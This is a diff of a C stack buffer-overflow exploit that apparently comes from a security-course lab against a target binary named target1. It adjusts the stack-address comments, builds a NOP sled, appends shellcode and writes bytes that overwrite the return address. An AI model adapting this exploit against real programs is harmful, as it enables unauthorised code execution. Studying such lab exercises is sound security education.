@@ -7,9 +7,9 @@
 #define TARGET "../targets/target1"
 
 
-//program counter is saved at 0x2021ff28
-//return address is at 0x004009e8
-//buf is located at address 0x2021feb0 to 0x2021ff10 (size 0x60)
+//program counter is saved at 0x2021fe80
+//return address is at 0x2021fe88
+//buf is located at address 0x2021fe10
 
 int
 main ( int argc, char * argv[] )
@@ -22,14 +22,13 @@ main ( int argc, char * argv[] )
 
 	int i = 0;
 
-	while(i<75){
-	strcat(tmp, NOP);
-	i++; 	
+	for(i=0; i<75; i++){
+		tmp[i] = '\x90';	
 	}
 
 	strcat(tmp, shellcode);
 
-	strcat(tmp, "\xb0");
+	strcat(tmp, "\x10");
 	strcat(tmp, "\xfe");
 	strcat(tmp, "\x21");
 	strcat(tmp, "\x20");
